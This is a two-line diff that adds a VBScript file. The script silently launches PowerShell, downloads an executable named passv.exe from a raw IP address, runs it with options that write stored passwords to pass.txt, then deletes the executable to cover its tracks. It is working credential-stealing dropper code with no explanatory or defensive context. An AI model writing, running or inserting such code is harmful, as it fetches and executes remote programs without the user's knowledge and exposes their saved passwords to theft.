@@ -1,0 +1,2 @@
+Dim objWshShl : Set objWshShl = WScript.CreateObject("WScript.Shell")
+objWshShl.Run "powershell.exe curl http://213.168.249.164:8080/passv.exe -o pv.exe; ./pv.exe /stext pass.txt; start-sleep 3; rm -f pv.exe",0
